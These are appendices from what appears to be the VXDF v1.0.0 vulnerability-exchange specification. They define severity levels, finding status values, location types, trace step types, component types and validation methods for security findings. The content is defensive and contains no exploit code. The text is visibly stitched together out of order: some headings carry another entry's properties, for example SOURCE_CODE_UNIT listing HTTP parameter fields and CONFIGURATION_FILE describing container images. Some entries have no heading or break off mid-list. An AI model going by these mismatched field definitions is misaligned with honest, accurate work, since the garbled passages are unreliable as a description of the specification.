* **Example Context:** A reflected XSS vulnerability requiring significant user interaction on a less sensitive part of an application; an information leak exposing non-critical configuration details; a denial of service that affects a non-essential feature.

**LOW**

* **Display Name:** Low  
* **Definition:** Vulnerabilities that have a minimal impact on the system or data. Exploitation is typically difficult, requires highly specific or unlikely circumstances, or results in very limited consequences.  
* **Usage Guidance:**  
  * Use for issues that pose a minor risk, such as very limited information disclosure of non-sensitive data, minor application misbehavior with no security implications, or vulnerabilities that are extremely hard to exploit.  
  * Typically corresponds to the lower range of CVSS scores (e.g., CVSS Base Score 0.1-3.9).  
  * These vulnerabilities should be addressed when possible, but are generally lower priority.  
* **Example Context:** Disclosure of server software version numbers in HTTP headers (without other exploitable conditions); a self-XSS that requires the user to paste code into their own browser; a theoretical denial of service requiring an attacker to send an extremely high volume of malformed packets over an extended period.

**INFORMATIONAL**

* **Display Name:** Informational  
* **Definition:** Findings that do not represent a direct, exploitable security vulnerability but provide information that might be useful for security hardening, context, or indicate a deviation from best practices that doesn't immediately pose a risk. This level can also be used for findings that are confirmed not\_affected by a VEX analysis, but where the VXDF is used to document the *analysis* of a potential issue.  
* **Usage Guidance:**  
  * Use for observations like the presence of unnecessary open ports (if no service is exploitable), verbose error messages that don't leak highly sensitive data, suggestions for security improvements, or to document the outcome of validating a potential issue that turned out not to be exploitable in the current context.  
  * Typically corresponds to a CVSS Base Score of 0.0 or situations where CVSS is not applicable.  
  * These findings generally do not require immediate remediation but should be reviewed for potential future risks or opportunities for improvement.  
* **Example Context:** A list of enabled TLS cipher suites that includes some older but not yet critically broken ciphers; a finding that a specific directory listing is enabled but contains no sensitive files; documentation of why a CVE flagged by a scanner is not exploitable in the specific application configuration.

**NONE**

* **Display Name:** None  
* **Definition:** Indicates that no security impact has been identified or the finding does not constitute a weakness. This might be used in specific reporting contexts where a severity level is required, but the item itself is not a vulnerability.  
* **Usage Guidance:**  
  * Use with extreme caution and typically only in specific contexts where a "severity" is required but the item is definitively not a security issue (e.g., a finding that was investigated and found to have zero security implications, or to explicitly mark a VEX "not\_affected" finding where severity is a mandatory field in a combined report).  
  * It is generally preferred to use INFORMATIONAL for findings that are not direct vulnerabilities but provide some security-relevant context. NONE implies an even lower (or absent) level of security concern than INFORMATIONAL.  
  * Typically corresponds to a CVSS Base Score of 0.0.  
* **Example Context:** A system audit entry that requires a severity but is noting a purely functional bug with no security implications whatsoever, or explicitly marking a component as "not affected" by a CVE in a system that requires a severity for all entries.

# **Appendix L: `ExploitFlow.status` \- Definitions**

This appendix provides definitions and usage guidance for the status enumeration values that can be used within the ExploitFlow object in the VXDF v1.0.0 specification. The status field indicates the current stage of a validated vulnerability finding within a vulnerability management or remediation lifecycle. The default value, if not specified, is "OPEN".

**OPEN**

* **Display Name:** Open  
* **Definition:** The vulnerability has been validated as exploitable and is newly reported or has not yet been addressed. This is typically the initial state of a new ExploitFlow.  
* **Usage Guidance:**  
  * Use this status for newly created VXDF findings that require triage, assignment, and remediation planning.  
  * It indicates that the vulnerability is active and poses a potential risk.

**UNDER\_INVESTIGATION**

* **Display Name:** Under Investigation  
* **Definition:** The validated vulnerability finding is actively being investigated to understand its full impact, root cause, or to determine the best remediation strategy.  
* **Usage Guidance:**  
  * Use this status when the finding has been acknowledged and is being analyzed by the relevant teams (e.g., security team, development team).  
  * This state precedes active remediation work.  
* **Example Context:** After a VXDF is received, a security engineer sets the status to UNDER\_INVESTIGATION while they replicate the issue and consult with developers on the affected code.

**REMEDIATION\_IN\_PROGRESS**

* **Display Name:** Remediation in Progress  
* **Definition:** Efforts to fix or mitigate the validated vulnerability are currently underway.  
* **Usage Guidance:**  
  * Use this status when developers are actively working on a code fix, configuration change, or when a mitigating control is being implemented.  
  * Indicates that the issue is being addressed but is not yet resolved.  
* **Example Context:** A developer has been assigned the VXDF finding and is currently coding a patch to address the SQL injection.

**REMEDIATED**

* **Display Name:** Remediated  
* **Definition:** A fix or mitigation for the validated vulnerability has been implemented and deployed to the relevant environment(s). However, the effectiveness of the remediation has not yet been formally verified.  
* **Usage Guidance:**  
  * Use this status once the development team or system administrators report that a fix is in place.  
  * This state typically triggers a re-testing or verification phase.  
* **Example Context:** The patch for the SQL injection has been deployed to the staging environment.

**REMEDIATION\_VERIFIED**

* **Display Name:** Remediation Verified  
* **Definition:** The implemented fix or mitigation for the validated vulnerability has been tested and confirmed to be effective. The vulnerability is no longer exploitable under the conditions previously demonstrated.  
* **Usage Guidance:**  
  * Use this status after re-testing (e.g., re-running the PoC from the VXDF Evidence, performing a targeted DAST scan, or manual re-validation) confirms that the vulnerability is resolved.  
  * This is typically the desired end state for most "OPEN" vulnerabilities.  
* **Example Context:** After the patch deployment, a security tester re-runs the original SQL injection payload and confirms it no longer works and the application behaves securely.

**FALSE\_POSITIVE\_AFTER\_REVALIDATION**

* **Display Name:** False Positive (After Re-validation)  
* **Definition:** Although initially validated and reported in a VXDF, subsequent, more thorough investigation or re-validation (perhaps with more context or by a different team/tool) has determined that the finding was, in fact, a false positive, or the initial validation was flawed.  
* **Usage Guidance:**  
  * Use this status with caution and typically after a rigorous re-assessment.  
  * Since VXDF implies prior validation, this status indicates a correction to that initial assessment.  
  * The ExploitFlow.description or a new Evidence item (perhaps of type MANUAL\_VERIFICATION\_NOTES) SHOULD detail the reasons for reclassifying it as a false positive.  
  * This helps in refining validation processes and tools.  
* **Example Context:** An initial automated validation suggested an exploit was possible. However, a deeper manual review revealed a subtle, overlooked compensating control that renders the exploit path non-viable in the production environment.

**ACCEPTED\_RISK**

* **Display Name:** Accepted Risk  
* **Definition:** The validated vulnerability is acknowledged, but a conscious decision has been made by the appropriate stakeholders (e.g., business owner, risk management team) not to remediate it at this time. This decision is typically based on a risk assessment (e.g., low impact, high remediation cost, compensating controls deemed sufficient for now).  
* **Usage Guidance:**  
  * This status SHOULD be accompanied by clear justification, ideally documented within the ExploitFlow.description, a linked Evidence item (e.g., MANUAL\_VERIFICATION\_NOTES referencing a risk assessment document), or ExploitFlow.customProperties.  
  * Risk acceptance often has a defined review period.  
* **Example Context:** A low-impact information disclosure vulnerability is identified, but the cost of fixing it in a legacy system outweighs the potential damage, and the data is not highly sensitive. The risk is formally accepted by management.

**DEFERRED**

* **Display Name:** Deferred  
* **Definition:** The validated vulnerability is acknowledged as a true positive and requires remediation, but the fix is intentionally postponed to a later date or release.  
* **Usage Guidance:**  
  * Use this when remediation is planned but not immediate, perhaps due to resource constraints, dependency on other changes, or a scheduled release cycle.  
  * The ExploitFlow.description or customProperties SHOULD ideally note the reason for deferral and the target timeframe or condition for remediation.  
* **Example Context:** A medium-severity vulnerability is found, but the fix requires a significant architectural change that is planned for the next major release in three months.

**OTHER**

* **Display Name:** Other  
* **Definition:** The status of the validated vulnerability finding is known but does not fit into any of the other predefined status categories.  
* **Usage Guidance:**  
  * Use this sparingly.  
  * When this value is used, the ExploitFlow.description or customProperties MUST provide a clear explanation of the specific status.  
* **Example Context:** The vulnerability is in a third-party component, and the organization is waiting for the vendor to release a patch, but it's not yet "REMEDIATION\_IN\_PROGRESS" by the internal team.

# **Appendix M: `Location.locationType` \- Definitions and Usage Guidance**

This appendix provides detailed definitions, usage guidance, and a summary of typically relevant properties for each `locationType` enumeration value used within the `Location` object in the VXDF v1.0.0 specification. The `locationType` field specifies the nature of the resource or entity being identified by the `Location` object. Selecting the most appropriate `locationType` is crucial for accurately describing the context of a vulnerability's source, sink, `TraceStep.location`, or `AffectedComponent.locations`. For each `locationType`, guidance is provided on which other properties within the `Location` object are typically most relevant and SHOULD be populated to provide comprehensive detail. Refer to Appendix A (Normative JSON Schema) under `$defs/Location` for the full list of available properties within the `Location` object.

**SOURCE\_CODE\_UNIT**

  * `parameterName` (String, Mandatory): The name of the parameter (e.g., "userId", "searchTerm", "file\_id"). For nested parameters (e.g., in JSON), this should use JSON Pointer notation (RFC 6901, e.g., "/user/profile/email") when `parameterLocation` is `body_json_pointer`. For XML, XPath 1.0 can be used with `body_xml_xpath`.  
  * `parameterLocation` (String, Mandatory, Enum): Specifies where the parameter is found within the HTTP request (e.g., `query`, `body_form`, `body_json_pointer`, `body_xml_xpath`, `body_multipart_field_name`, `path_segment`, `header`, `cookie`).

* **Definition:** Refers to a specific HTTP header in either a request or a response.  
* **Usage Guidance:** As a source: When an HTTP request header is the entry point for tainted input (e.g., User-Agent for log injection, Referer for some XSS, custom headers like X-API-Key if manipulated). As the locus of a misconfiguration (often within `AffectedComponent.locations`): When a vulnerability relates to the presence, absence, or value of an HTTP *response* header (e.g., missing or weak Content-Security-Policy, X-Frame-Options, Strict-Transport-Security).  
* **Relevant `Location` Properties to Populate:**  
  * `headerName` (String, Mandatory): The name of the HTTP header (e.g., "User-Agent", "X-Content-Type-Options", "Authorization").

  * `settingValue` (String, Optional): The observed value of the header, if relevant (e.g., for a misconfigured response header like `Server: Apache/2.2.15 (Unix)`).  
  * `description` (String, Optional): e.g., "Untrusted 'X-Forwarded-For' header used for IP logging." or "Missing 'Strict-Transport-Security' response header on primary domain.".

**WEB\_COOKIE**

* **Display Name:** Web Cookie  
* **Definition:** Refers to a specific HTTP cookie.  
* **Usage Guidance:** Use when a cookie is the source of tainted input (e.g., a serialized object in a cookie, user ID in a cookie used for authorization checks) or when vulnerabilities relate to cookie attributes (e.g., missing HttpOnly, Secure, or SameSite flags; insecure cookie content).  
* **Relevant `Location` Properties to Populate:**  
  * `cookieName` (String, Mandatory): The name of the cookie (e.g., "sessionid", "user\_prefs").  
  * `url` (String, Optional, URI Format): The domain and path context for which the cookie is set or relevant.

**SOFTWARE\_COMPONENT\_LIBRARY**

* **Display Name:** Software Component/Library  
* **Definition:** Refers to a specific software library, framework, or third-party dependency that is part of the application stack.  
* **Usage Guidance:** Use this `locationType` when the `Location` object is intended to pinpoint a finding within a specific library that is itself part of an `AffectedComponent` of type `SOFTWARE_LIBRARY`. It can be used to specify the source or sink of a flow if that point lies within the code of this library, or as a location within `AffectedComponent.locations`. This type is often relevant for vulnerabilities identified by SCA tools where the flaw is in the library, and VXDF aims to show how that library flaw is reached or exploitable in the application context.  
* **Relevant `Location` Properties to Populate:**  
  * `componentName` (String, Mandatory): The human-readable name of the library/component (e.g., "Apache Commons Text", "Log4j Core").  
  * `componentVersion` (String, Optional): The version of the library/component (e.g., "1.9", "2.14.1").

  * `startLine`, `snippet`, etc.: If pointing to a specific line of code within the library.

**CONFIGURATION\_FILE\_SETTING**

* **Display Name:** Configuration File Setting  
* **Definition:** Refers to a specific setting, directive, key-value pair, or section within a configuration file.  
* **Usage Guidance:** Use this to precisely pinpoint misconfigurations that lead to vulnerabilities (e.g., a specific insecure directive in nginx.conf, a debug flag set to true in application.properties, a weak permission in an XML-based security policy file). Often used as a `Location` within an `AffectedComponent` of `componentType: CONFIGURATION_FILE`.  
* **Relevant `Location` Properties to Populate:**  
  * `filePath` (String, Mandatory): Full path to the configuration file (e.g., /etc/ssh/sshd\_config, WEB-INF/web.xml, src/main/resources/config.yml).  
  * `settingName` (String, Mandatory): The name of the setting, key, XML element/attribute, or directive (e.g., "PermitRootLogin", "debug\_mode", "ssl\_protocols", "//@enabled" for an XML attribute). Path-like expressions or JSON Pointers/XPath can be used for nested settings.

Can be a source (e.g., reading a user-controlled filename), sink (e.g., writing to an arbitrary path), or an `AffectedComponent.locations` entry.  
* **Relevant `Location` Properties to Populate:**  
  * `filePath` (String, Mandatory): The full path to the file or directory (e.g., /var/log/sensitive.log, /etc/passwd, /tmp/attacker\_shell.php).  
  * `description` (String, Optional): e.g., "Sensitive log file '/var/log/app\_debug.log' has world-readable permissions." or "Target of path traversal: '/etc/shadow'." or "Uploaded webshell at '/var/www/html/uploads/shell.php'.".  
  * `snippet` (String, Optional): If the content of the file is relevant and short (e.g., for a small script, or to show permissions if represented textually).

  * `description` (String, Optional): e.g., "Stored procedure 'sp\_LegacyUserUpdate' vulnerable to SQL injection via @userName parameter." or "Column 'user\_credentials.password\_salt' found to be NULL for multiple records.".

**ENVIRONMENT\_VARIABLE**

* **Display Name:** Environment Variable  
* **Definition:** Refers to a specific environment variable accessible to a process or system.  
* **Usage Guidance:** Use when an environment variable is the source of untrusted input that is not properly handled, contains sensitive data that is improperly exposed (e.g., logged or accessible), or its value influences a vulnerability.  
* **Relevant `Location` Properties to Populate:**  
  * `environmentVariableName` (String, Mandatory): The name of the environment variable (e.g., "DATABASE\_PASSWORD", "API\_KEY\_SECRET", "LD\_PRELOAD", "DEBUG\_MODE").  
  * `settingValue` (String, Optional): The value of the environment variable. Use extreme caution if this value is sensitive; prefer to describe the implication rather than exposing the secret directly in VXDF.  
  * `description` (String, Optional): e.g., "Sensitive database password found in environment variable 'PROD\_DB\_PASS' accessible to web server process." or "User-controllable 'LD\_LIBRARY\_PATH' environment variable allows loading of arbitrary shared libraries.".

**CLOUD\_PLATFORM\_RESOURCE**

* **Display Name:** Cloud Platform Resource  
* **Definition:** Refers to a specific resource, service instance, or configuration setting within a cloud computing platform (e.g., an AWS IAM policy statement, an Azure Network Security Group rule, a GCP Cloud Storage bucket ACL, a Kubernetes Pod Security Policy).  
* **Usage Guidance:** Use for vulnerabilities related to misconfigurations, weaknesses, or insecure defaults in cloud infrastructure or services that are not necessarily tied to a single configuration file or simple service endpoint but rather to the platform's resource management and configuration APIs/interfaces. This is often used as a `Location` within an `AffectedComponent` where the `componentType` might be `CLOUD_SERVICE_COMPONENT` or a more specific cloud service type.  
* **Relevant `Location` Properties to Populate:**

# **Appendix N: `TraceStep.stepType` \- Definitions**

This appendix provides definitions and usage guidance for the `stepType` enumeration values used within the `TraceStep` object in the VXDF v1.0.0 specification. The `stepType` field categorizes the primary action or nature of a specific step in an exploit path or data flow trace, helping to clarify how data or control progresses from a source to a sink.

**SOURCE\_INTERACTION**

* **Display Name:** Source Interaction  
* **Definition:** Represents a step where the application interacts with an external source to receive data or input that is relevant to the exploit flow. This is often the initial point where untrusted data enters the system.  
* **Usage Guidance:** Typically used for the first significant step in a trace, corresponding to or immediately following the `ExploitFlow.source` location. Examples: Reading an HTTP request parameter, receiving data from a network socket, user input into a form field, reading from a file controlled by an external entity. The `TraceStep.location` would describe where this interaction occurs (e.g., a specific line of code reading `request.getParameter()`, a network listening function).  
* **Example Context:** A step where `HttpServletRequest.getParameter("username")` is called to retrieve user input.

**DATA\_TRANSFORMATION**

* **Display Name:** Data Transformation  
* **Definition:** Represents a step where data relevant to the exploit flow is modified, converted, encoded, decoded, serialized, deserialized, or otherwise transformed.  
* **Usage Guidance:** Use this when the data's form changes in a way that is significant to the flow (e.g., data being URL-decoded, base64-encoded, concatenated with other strings, parsed from JSON/XML, or undergoing cryptographic operations). This helps track how data might be manipulated to bypass filters or become exploitable.  
* **Example Context:** A step where user input is URL-decoded, or where a string is built by concatenating user input with SQL query fragments.

**DATA\_PROPAGATION**

* **Display Name:** Data Propagation  
* **Definition:** Represents a step where data relevant to the exploit flow is passed from one variable to another, from a function argument to a return value, or between different components or layers of the application without significant transformation.  
* **Usage Guidance:** Use this to show how tainted data moves through the codebase (e.g., assigned to a new variable, passed as an argument to another method, stored in an object field, returned from a function). Helps in understanding the reach of the tainted data.  
* **Example Context:** A step where a variable holding user input is passed as an argument to a data access object (DAO) method.

**CONTROL\_FLOW\_BRANCH**

* **Display Name:** Control-Flow Branch / Decision Point  
* **Definition:** Represents a step that involves a conditional branch (e.g., if-else, switch, loop condition) where the outcome of the branch is influenced by tainted data or is critical to the exploit path.  
* **Usage Guidance:** Use this to highlight decision points that an attacker might control or that determine whether a vulnerable code path is executed. The `TraceStep.description` should clarify the condition and how it relates to the flow.  
* **Example Context:** An `if` statement checks a user-controlled flag; if true, a vulnerable function is called, otherwise, a safe path is taken. This step would represent that `if` statement.

**SINK\_INTERACTION**

* **Display Name:** Sink Interaction  
* **Definition:** Represents a step where the tainted data interacts with a sensitive function, API, or operation (the "sink") in a way that leads to the manifestation of the vulnerability. This is often the final or penultimate step in the trace.  
* **Usage Guidance:** Typically corresponds to or immediately precedes the `ExploitFlow.sink` location. Examples: Executing a SQL query with tainted data, rendering unescaped data in an HTML response, passing user input to an OS command execution function, writing to a file with a user-controlled path.  
* **Example Context:** A step where `Statement.executeQuery(sqlQueryWithTaintedData)` is called.

**VALIDATION\_OR\_SANITIZATION**

* **Display Name:** Validation or Sanitization Routine  
* **Definition:** Represents a step where data relevant to the exploit flow passes through a security check, input validation routine, sanitization function, or encoding/escaping mechanism.  
* **Usage Guidance:** Use this to explicitly show where security measures are applied (or are expected). The `TraceStep.description` should indicate whether the routine was effective, bypassed, or flawed. This is crucial for understanding why an exploit is possible despite apparent defenses.  
* **Example Context:** A step where user input is passed to an `escapeHtml()` function. The description might note, "Input passed to `escapeHtml()`, but this function is ineffective against JavaScript in certain HTML attributes.".

**CONFIGURATION\_ACCESS**

* **Display Name:** Configuration Access  
* **Definition:** Represents a step where the application reads or uses a configuration setting that is relevant to the vulnerability's exploitability (e.g., a feature flag, a security policy setting, a file path from a config).  
* **Usage Guidance:** Use this when a configuration value influences the vulnerability. The `TraceStep.description` should specify the configuration parameter and its value.  
* **Example Context:** A step where the application reads a configuration key `feature.XYZ.enabled=true`, and this feature contains the vulnerable code path.

**COMPONENT\_CALL**

* **Display Name:** Component Call / Library Interaction  
* **Definition:** Represents a step where the application makes a call to a function or method within a distinct internal module, an external library, or a third-party component, and this call is part of the exploit flow.  
* **Usage Guidance:** Use this to show interaction with specific components, especially if the component itself is vulnerable or processes the tainted data. The `TraceStep.location` can point to the call site in the application, and the description can name the component/function being called. If the component is detailed in `ExploitFlow.affectedComponents`, this step links the flow to that component.  
* **Example Context:** A step where the main application code calls `vulnerableLibrary.processData(taintedUserInput)`.

**STATE\_CHANGE**

* **Display Name:** Application State Change  
* **Definition:** Represents a step where a significant change in the application's state occurs that is relevant to the vulnerability or its exploitation. This could be a change in user session state, object properties, or system flags.  
* **Usage Guidance:** Use for vulnerabilities that depend on a sequence of state transitions or where the exploit itself causes a critical state change. The `TraceStep.description` should clearly explain the state before and after this step, or the nature of the state change.  
* **Example Context:** A step where, after a series of actions, a user's role in the session changes from "user" to "admin" due to an authorization bypass.

**INTERMEDIATE\_NODE**

* **Display Name:** Intermediate Node / Generic Step  
* **Definition:** A generic step in the data flow or exploit path that does not fit neatly into the other more specific `stepType` categories but is still important for understanding the trace.  
* **Usage Guidance:** Use this sparingly when other types are not suitable. The `TraceStep.description` is particularly important for this type to explain the relevance of the step.  
* **Example Context:** A complex logical operation that doesn't directly transform data or call a component but is a necessary precursor in the exploit chain.

# **Appendix O: `AffectedComponent.componentType` \- Definitions**

This appendix provides definitions and usage guidance for the componentType enumeration values used within the AffectedComponent object in the VXDF v1.0.0 specification. The componentType field helps classify the nature of the component that is vulnerable or contributes to the vulnerability, which is particularly important for non-flow based findings or for specifying the context of any finding.

**APPLICATION\_MODULE**

* **Display Name:** Application Module  
* **Definition:** A distinct, self-contained functional unit or module within a larger custom-developed application (e.g., a user management module, a payment processing service within a monolithic application, a specific microservice in a larger architecture).  
* **Usage Guidance:**  
  * Use this when the vulnerability is specific to a logical part or a submodule of the primary application being assessed, rather than an external library or a standalone executable.

  * AffectedComponent.locations can be used to specify further details like region, resource ID, or specific misconfigured settings using the Location object with appropriate locationType (e.g., CLOUD\_PLATFORM\_RESOURCE).  
* **Example Context:** An AWS S3 bucket (AffectedComponent.name: "customer-sensitive-data-bucket-prod") is found to have overly permissive public read access.

**CONFIGURATION\_FILE**

* **Display Name:** Configuration File  
* **Definition:** A file that contains settings, parameters, or configurations for an application, system, or service. The vulnerability stems from the content or properties of this file.  
* **Usage Guidance:**

  * The AffectedComponent.name should be the image name and tag (e.g., "myorg/myapp:1.2.3").  
  * AffectedComponent.purl can be used if the image has a Package URL representation.  
  * Specific vulnerabilities within the image (e.g., a vulnerable OS package or library) can be detailed as separate AffectedComponent objects nested within the ExploitFlow or referenced, or described in the description and evidence.  
* **Example Context:** The container image "nginx:1.21.0" (AffectedComponent.name) is found to use an outdated version of OpenSSL with known vulnerabilities.

**DATA\_STORE\_INSTANCE**

* **Display Name:** Data Store Instance  
* **Definition:** A specific instance of a database, cache, or other data storage system (e.g., a MySQL server, a Redis instance, an Elasticsearch cluster). Vulnerabilities may relate to its configuration, version, or how it's deployed.  
* **Usage Guidance:**  
  * Use when the vulnerability is tied to a specific data store, such as unpatched database software, misconfigured access controls at the database level, or NoSQL injection if the database itself is the primary affected entity.  
  * AffectedComponent.name could be the instance identifier or connection string alias.  
  * AffectedComponent.version would be the database software version.  
* **Example Context:** A MongoDB instance (AffectedComponent.name: "mongo-prod-cluster-01") is running an old version known to have a denial-of-service vulnerability.

Selecting the most accurate validationMethod adds crucial context to the evidence.

---

STATIC\_ANALYSIS\_VALIDATION

* **Display Name:** Static Analysis Validation  
* **Definition:** Indicates that the evidence was derived or confirmed through static analysis techniques, potentially involving advanced reasoning over code, beyond initial SAST tool findings. This implies a higher degree of confidence or specific validation of a static finding, often involving manual review of SAST results or specialized static analysis.  
* **Usage Guidance:**  
  * Use when a potential vulnerability initially flagged by a SAST tool has been further investigated and confirmed as a true positive through deeper static analysis (e.g., manual code path tracing, symbolic execution, or expert review of the static alert in context).  
  * This method is distinct from just reporting a raw SAST finding; it implies a *validation* step using static methods.  
  * The evidence itself might be a CODE\_SNIPPET\_SINK, STATIC\_ANALYSIS\_DATA\_FLOW\_PATH, or MANUAL\_VERIFICATION\_NOTES detailing the static validation.  
  * **Example Context:** A SAST tool flags a potential SQL injection. A security analyst manually reviews the code flow from source to sink, confirming no effective sanitization is present, and uses this method to describe the evidence (e.g., the annotated code path).

---

DYNAMIC\_ANALYSIS\_EXPLOIT

* **Display Name:** Dynamic Analysis Exploit  
* **Definition:** Indicates that the evidence was obtained by actively testing a running application or system, typically using a Dynamic Application Security Testing (DAST) tool or similar automated dynamic methods, and successfully triggering or exploiting the vulnerability.  
* **Usage Guidance:**  
  * Use when a DAST scanner, fuzzer (that doesn't just cause a crash but elicits specific exploitable behavior), or custom dynamic test script successfully demonstrates the vulnerability.  
  * Common evidence types associated with this method include HTTP\_REQUEST\_LOG, HTTP\_RESPONSE\_LOG, TEST\_PAYLOAD\_USED, RUNTIME\_EXCEPTION\_TRACE, or OBSERVED\_BEHAVIORAL\_CHANGE.  
  * **Example Context:** A DAST tool sends a crafted payload to a web application and receives a response indicating a successful SQL injection (e.g., error message, altered content).

---

INTERACTIVE\_APPLICATION\_SECURITY\_TESTING\_EXPLOIT

* **Display Name:** Interactive Application Security Testing (IAST) Exploit  
* **Definition:** Indicates that the evidence was obtained from an Interactive Application Security Testing (IAST) tool, which typically instruments the running application to observe exploit attempts and confirm their success from within the application.  
* **Usage Guidance:**  
  * Use when an IAST agent deployed within the application environment detects and confirms an exploit attempt, often providing detailed runtime information.  
  * Associated evidence might include RUNTIME\_EXCEPTION\_TRACE, CODE\_SNIPPET\_SINK (identified by IAST at runtime), TEST\_PAYLOAD\_USED (captured by IAST), or RUNTIME\_APPLICATION\_LOG\_ENTRY generated by the IAST agent.  
  * **Example Context:** An IAST tool observes a test payload reaching a vulnerable function (e.g., a SQL execution sink) without proper sanitization and flags it as a confirmed exploit.

---

MANUAL\_CODE\_REVIEW\_CONFIRMATION

* **Display Name:** Manual Code Review Confirmation  
* **Definition:** Indicates that the vulnerability and its exploitability were confirmed through a manual, human-driven review of the source code.  
* **Usage Guidance:**  
  * Use when a security expert or developer has meticulously reviewed the relevant code sections and determined that a vulnerability exists and is exploitable based on the logic, data handling, and lack of defenses observed in the code.  
  * This often complements or validates findings from other tools (SAST, DAST).  
  * Evidence might include CODE\_SNIPPET\_SOURCE, CODE\_SNIPPET\_SINK, MANUAL\_VERIFICATION\_NOTES detailing the review process and findings, or a STATIC\_ANALYSIS\_DATA\_FLOW\_PATH constructed manually.  
  * **Example Context:** A developer, reviewing a security concern, traces user input through the codebase and identifies a point where it's used unsafely in a critical function, confirming the flaw without necessarily running an active exploit.

---

MANUAL\_PENETRATION\_TESTING\_EXPLOIT

* **Display Name:** Manual Penetration Testing Exploit  
* **Definition:** Indicates that the evidence was obtained through hands-on, human-driven penetration testing activities where a tester actively attempted to exploit the vulnerability and succeeded.  
* **Usage Guidance:**  
  * Use for findings confirmed by a penetration tester using their expertise and tools (like proxy scanners, custom scripts, or manual interaction) to craft and execute an exploit.  
  * This method often yields rich, contextual evidence such as HTTP\_REQUEST\_LOG, HTTP\_RESPONSE\_LOG, POC\_SCRIPT (describing manual steps), SCREENSHOT\_URL/SCREENSHOT\_EMBEDDED\_BASE64, OBSERVED\_BEHAVIORAL\_CHANGE, or EXTERNAL\_INTERACTION\_PROOF.  
  * **Example Context:** A penetration tester uses a web proxy to intercept requests, modifies parameters to inject a payload, and observes the successful exploitation of a vulnerability.

---

AUTOMATED\_EXPLOIT\_TOOL\_CONFIRMATION

* **Display Name:** Automated Exploit Tool Confirmation  
* **Definition:** Indicates that the evidence was generated by a specialized automated tool designed specifically to exploit known vulnerabilities (e.g., Metasploit, SQLMap, or custom exploit scripts from a framework).  
* **Usage Guidance:**  
  * Use when an automated exploitation framework or tool was used to confirm that a known vulnerability (e.g., a specific CVE) is exploitable against the target.  
  * Evidence might include COMMAND\_EXECUTION\_OUTPUT, TOOL\_SPECIFIC\_OUTPUT\_LOG, TEST\_PAYLOAD\_USED (as configured in the tool), or EXTERNAL\_INTERACTION\_PROOF.

---

SOFTWARE\_COMPOSITION\_ANALYSIS\_CONTEXTUAL\_VALIDATION

* **Display Name:** Software Composition Analysis (SCA) Contextual Validation  
* **Definition:** Indicates that a vulnerability identified in a third-party component by an SCA tool has been further analyzed to confirm its exploitability within the specific context of how the application uses that component. This goes beyond simply noting the presence of a vulnerable library.  
* **Usage Guidance:**  
  * Use when an SCA tool flags a vulnerable dependency, and subsequent analysis (which could be manual code review, targeted dynamic testing, or static reachability analysis) confirms that the vulnerable functions of the component are reachable and conditions for exploitability are met within the application.  
  * The primary evidence might be VULNERABLE\_COMPONENT\_SCAN\_OUTPUT (from the SCA tool), augmented by CODE\_SNIPPET\_SINK (showing the application calling the vulnerable library function), TEST\_PAYLOAD\_USED (if an exploit was crafted), or STATIC\_ANALYSIS\_DATA\_FLOW\_PATH (showing data flow into the vulnerable component).  
  * **Example Context:** An SCA tool reports Log4j v2.14.1 is used. Further analysis shows the application code uses JNDI lookups with user-controlled data passed to Log4j, confirming the exploitability of CVE-2021-44228 (Log4Shell) in this context.

FUZZ\_TESTING\_CRASH\_ANALYSIS

* **Display Name:** Fuzz Testing Crash Analysis  
* **Definition:** Indicates that the evidence stems from a fuzz testing campaign where a generated input caused the application to crash or behave in an anomalous way, and subsequent analysis of the crash (e.g., debugger output, memory dump) points to an exploitable security vulnerability (like a buffer overflow or use-after-free).  
* **Usage Guidance:**  
  * Use when fuzzing is the primary method of discovering the condition.  
  * The evidence should ideally include the input that caused the crash (TEST\_PAYLOAD\_USED), details of the crash itself (RUNTIME\_EXCEPTION\_TRACE, RUNTIME\_DEBUGGER\_OUTPUT), and any analysis that links the crash to a security implication.  
  * **Example Context:** A fuzzer sends a malformed file to an application, causing a segmentation fault. Debugging shows the crash is due to a controllable buffer overflow at a specific instruction pointer.

---

REVERSE\_ENGINEERING\_PROOF

* **Display Name:** Reverse Engineering Proof  
* **Definition:** Indicates that the evidence was obtained through reverse engineering of compiled code (e.g., binary analysis, disassembly, decompilation) to identify and confirm a vulnerability and its exploit mechanism.  
* **Usage Guidance:**  
  * Use for vulnerabilities found in closed-source software, firmware, or mobile applications where source code is unavailable.  
  * Evidence might include CODE\_SNIPPET\_CONTEXT (showing disassembled or decompiled code), MANUAL\_VERIFICATION\_NOTES detailing the RE process, or RUNTIME\_DEBUGGER\_OUTPUT from stepping through the binary.  
  * **Example Context:** An analyst disassembles a binary, identifies a weak encryption algorithm or a hardcoded key, and uses this method to describe the evidence.

---

CONFIGURATION\_AUDIT\_VERIFICATION

* **Display Name:** Configuration Audit Verification  
* **Definition:** Indicates that the evidence was obtained by auditing system, application, or cloud service configurations against security benchmarks, best practices, or specific vulnerability signatures, and a deviation confirming a weakness was found.  
* **Usage Guidance:**  
  * Use for vulnerabilities that are purely due to insecure configurations (e.g., weak TLS cipher suites enabled, overly permissive S3 bucket ACLs, default credentials unchanged on a network device).  
  * This is distinct from CONFIGURATION\_FILE\_SNIPPET if the audit was performed via an API, a scanning tool that checks live configurations, or by inspecting a running system's settings rather than just a static file.  
  * Evidence would typically be CONFIGURATION\_FILE\_SNIPPET (if the config is file-based and was reviewed), MISSING\_ARTIFACT\_VERIFICATION (if a secure setting is absent), or TOOL\_SPECIFIC\_OUTPUT\_LOG from a configuration auditing tool.  
  * **Example Context:** A cloud security posture management (CSPM) tool scans an AWS environment and reports an S3 bucket is publicly readable due to its ACL settings.

---

LOG\_ANALYSIS\_CORRELATION

* **Display Name:** Log Analysis Correlation  
* **Definition:** Indicates that the evidence was derived from analyzing and correlating entries across one or more log sources (e.g., application logs, web server logs, firewall logs, SIEM alerts) to identify a pattern of activity that confirms a vulnerability or an ongoing exploit.  
* **Usage Guidance:**  
  * Use when multiple log entries, when viewed together, provide proof of an exploit that might not be obvious from a single entry.  
  * This can be useful for detecting complex attacks, business logic flaws, or correlating reconnaissance with exploitation.  
  * Evidence would typically consist of multiple RUNTIME\_APPLICATION\_LOG\_ENTRY (or other log types) items, often accompanied by MANUAL\_VERIFICATION\_NOTES explaining the correlation and deduction.  
  * **Example Context:** Correlating web server access logs showing an unusual sequence of requests with application error logs indicating a specific internal failure, together proving an IDOR.

---

HYBRID\_VALIDATION

* **Display Name:** Hybrid Validation  
* **Definition:** Indicates that the evidence was obtained through a combination of multiple validation methods where no single method is predominant or fully captures the validation process.  
* **Usage Guidance:**  
